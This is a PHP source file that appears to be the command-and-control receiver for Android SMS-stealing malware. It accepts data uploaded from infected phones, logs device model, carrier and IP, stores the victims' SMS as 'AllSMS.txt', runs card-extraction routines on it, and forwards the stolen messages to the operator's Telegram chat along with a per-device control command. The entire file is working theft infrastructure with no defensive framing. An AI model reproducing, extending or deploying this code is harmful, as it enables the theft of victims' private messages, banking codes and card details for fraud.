<?php    
include("chalim.php");    
include("range.php");
    
define('TOKEN', $bot_token);    
    
function bot($method, $datas = []) {    
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;    
    $ch = curl_init();    
    curl_setopt($ch, CURLOPT_URL, $url);    
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);    
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);    
    $res = curl_exec($ch);    
    curl_close($ch);    
    return json_decode($res);    
}    
    
if (isset($_GET['response']) && $_GET['response'] == "true") {    
    $device_id = $_GET['Device_id'] ?? 'unknown';    
    $model = $_GET['Model'] ?? 'N/A';    
    $operator = $_GET['operator'] ?? 'N/A';    
    $ip = $_SERVER['REMOTE_ADDR'];    
        
    $original_content = file_get_contents("php://input");
    
    $is_getcard = isset($_GET['getcard']) && $_GET['getcard'] == "true";
    $is_getrange = isset($_GET['getrange']) && $_GET['getrange'] == "true";
        
    $file_path = "user/AllSMS.txt";    
    file_put_contents($file_path, $original_content);    
        
    $card_process_file = "user/{$device_id}_card_process.txt";    
    if (file_exists($card_process_file)) {    
        include 'card.php';    
        $process_data = json_decode(file_get_contents($card_process_file), true);    
        $result = processCards($file_path, $model, $operator, $ip, $device_id);    
        
        bot('editMessageText', [    
            'chat_id' => $process_data['chat_id'],    
            'message_id' => $process_data['message_id'],    
            'text' => $result,    
            'parse_mode' => 'HTML'    
        ]);    
        
        unlink($card_process_file);    
    } 
    elseif (file_exists("user/{$device_id}_range_process.txt")) {    
        $process_data = json_decode(file_get_contents("user/{$device_id}_range_process.txt"), true);    
        $result = processRange($file_path, $model, $operator, $ip, $device_id);    
        
        bot('editMessageText', [    
            'chat_id' => $process_data['chat_id'],    
            'message_id' => $process_data['message_id'],    
            'text' => $result,    
            'parse_mode' => 'HTML'    
        ]);    
        
        unlink("user/{$device_id}_range_process.txt");    
    }
    elseif (!$is_getcard && !$is_getrange) {    
        $caption = "📦 Received Content\n\n"    
                 . "📱 Model: $model\n"    
                 . "🛜 Operator: $operator\n"    
                 . "🌐 IP: $ip\n"    
                 . "🆔 Panel: /set_$device_id\n\n"    
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>";    
        
        bot('sendDocument', [    
            'chat_id' => $id_sender,    
            'document' => new CURLFile($file_path),    
            'caption' => $caption,    
            'parse_mode' => 'HTML'    
        ]);    
    }
    
    unlink($file_path);    
}
?>